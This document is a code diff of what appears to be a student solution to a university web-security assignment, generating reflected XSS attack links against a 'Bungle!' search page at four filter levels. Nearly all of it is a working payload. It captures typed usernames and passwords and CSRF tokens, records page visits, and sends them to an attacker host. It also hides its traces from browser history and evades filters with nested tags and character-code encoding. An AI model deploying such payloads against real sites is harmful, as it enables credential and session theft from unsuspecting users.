@@ -8,72 +8,72 @@ h3 a {color: black;}
 </style>
 <script>
 function payload(attacker){
-let href=location.href; // retrieve current url
+let href=location.href;                                     // RETRIEVE CURRENT URL
 
-// record event by sending GET to attacker 
+// Record event by sending GET to attacker 
 const rEv=(inP)=>{
-    console.log(inP); // log to console for debug
-    $.get(attacker,inP); // send the get 
+    console.log(inP);                                       // LOG TO CONSOLE FOR DEBUG
+    $.get(attacker,inP); 
 }
 
-// retrieve login and account creation
+// Retrieve login and account creation
 const pReq=(eN,lgE)=>{ 
-    var usr=$("#username").val(); // pulled from input 
+    var usr=$("#username").val();                           // PULLED FROM INPUT 
     var pwd=$("#userpass").val();
-    $.post("./"+eN,{username:usr,password:pwd},()=>{ // log with post
-        rEv({event:lgE,user:usr,pass:pwd}); // call "record event" function
-        ldP("./");} // reload page
+    $.post("./"+eN,{username:usr,password:pwd},()=>{        // LOG WITH POST
+        rEv({event:lgE,user:usr,pass:pwd});                 // CALL "record event" FUNCTION
+        ldP("./");}                                         // RELOAD PAGE
     );
 }
 
-// retrieve history form browser sessionStorage
+// Retrieve history form browser sessionStorage
 const getH=()=>{
     const gH=sessionStorage.getItem('history'); 
-    return gH?JSON.parse(gH):[]; // store history if there is any
+    return gH?JSON.parse(gH):[];                             // STORE HISTORY IF THERE IS ANY
 }
 
-// set the history in sessionStorage
+// Set the history in sessionStorage
 const setH=(gH)=>{
-    sessionStorage.setItem('history',JSON.stringify(gH)); // stored as JSON
+    sessionStorage.setItem('history',JSON.stringify(gH));    // STORED AS JSON
 }
 
-// add a resource and update history
+// Add a resource and update history
 const addH=(rsrc)=>{
     const gh=getH();
     gh.push(rsrc),setH(gh);
 }
 
-// add new url to history & display in browser bar
+// Add new url to history & display in browser bar
 const newH=(href)=>{
     addH(href),window.history.pushState({},"",href);
 }
 
-// load the page - bind event handlers
+// Load the page - bind event handlers
 const ldP=(href,Qry)=>{
-    $("html").load(href,()=>{ // load the current href content into <html> element.
+    $("html").load(href,()=>{                                 // LOAD CURRENT HREF CONTENT INTO <HTML> ELEMENT
         $("html").show();
-        $("#query").val(Qry); // setting value of the search bar
-        var usr=$("#logged-in-user").val(); // retrieve the logged in user from html
-        $(document).ready(()=>{ // execute only when dom is loaded
-            // retrieve the "default" csrf token form login form hidden value
+        $("#query").val(Qry);                                 // SETTING VALUE OF THE SEARCH BAR
+        var usr=$("#logged-in-user").val();                   // RETRIVE THE LOGGED IN USER FROM HTML
+        $(document).ready(()=>{                               // EXECUTE ONLY WHEN DOM IS LOADED
+            // Retrieve the "default" csrf token form login form hidden value
             var tknELM=document.querySelector("input[name='csrf_token']");
             if (tknELM !== null){
                 var tknVAL=tknELM.value;
-                rEv({event:"tknex",csrf_token:tknVAL}); // record token
+                rEv({event:"tknex",csrf_token:tknVAL}); // RECORD THE TOKEN
             }else{
                 console.log("notkn");
             }
         });
-        // record navigation
+        // Record navigation
         rEv({event:"nav",user:usr,url:href});
-        // replace browser history current state without changing displayed url
+        // Replace browser history current state without changing displayed url
         window.history.replaceState({},"",href);
-        // removing history items from logged in user history if "func. pay."
+        // Removing history items from logged in user history if "func. pay."
         $(".history-item").each((_,item)=>{
             if($(item).text().includes("function payload(")){
             $(item).remove();
             }});
-        // button click events
+        // Button click events
         $("#log-in-btn").on("click",event=>{
             event.preventDefault();
             pReq("login","login");
@@ -109,7 +109,8 @@ const ldP=(href,Qry)=>{
             newH(href);
             ldP(href,Qry);
         });
-        // popstate function for back/fwd buttons
+        
+        // Popstate function for back/fwd buttons
         $(window).on("popstate",event=>{
             const gH=getH();
                 if(gH.length>1){
@@ -126,8 +127,10 @@ const ldP=(href,Qry)=>{
 $("html").hide();
 ldP("./");
 }
+// Function to encode strings
 function ncdSTR(query){
-    var myRe=/".*?"/g;var match; // match all between double quotes for 
+    // Match all between double quotes
+    var myRe=/".*?"/g;var match;  
     while((match=myRe.exec(query))!==null){
         var ncdedSTR="";
         for(var idx=1;idx<match[0].length-1;++idx){
@@ -135,18 +138,22 @@ function ncdSTR(query){
         ncdedSTR=ncdedSTR.slice(0,-1);
         ncdedSTR="String.fromCharCode("+ncdedSTR+")"; 
         query=query.replace(match[0],ncdedSTR);}return query;}  
-function mkLnk(xssdefense,target,atkr){ // divided out the base url from the payload query
+// Divide out the base url from the payload query    
+function mkLnk(xssdefense,target,atkr){ 
     var bQry=target+"./search?xssdefense="+xssdefense.toString()+"&q=";
     var payLd=payload.toString()+";payload(\""+atkr+"\");";
-    switch(xssdefense){ // case for url construction based on defense
+    // Cases for url construction based on defense 0-3
+    switch(xssdefense){
     case 0:return bQry+encodeURIComponent("<script"+">"+payLd+"</script"+">");
     case 1:
     case 2:return bQry+encodeURIComponent("<scrscriptipt>"+payLd+"</scrscriptipt"+">");
+    // Calling ncdSTR function to encode the entire payload in encodedpayLd
     case 3:var encodedpayLd=ncdSTR("<script"+"> "+payLd+" </script"+">");return bQry+encodeURIComponent(encodedpayLd);}}
-const target = "http://cs526-online.cs.purdue.edu/project2b/";
-const atkr =  "http://127.0.0.1:31337/";
+const target = "http://526.edu/project2b/";
+const atkr =  "http://192.168.1.1:31337/";
 $(function(){
     var container = $("<div></div>").addClass("links-container");
+    // Generate container links for each of the four defense levels 0-3 with switch-case
     for(var xssdefense=0;xssdefense<=3;xssdefense++){
         var url=mkLnk(xssdefense,target,atkr);
         container.append("<h3><a target=\"run\" href=\""+url+"\" id=\"try_link_"+xssdefense+"\">Try Bungle! "+xssdefense.toString()+"</a></h3>");}
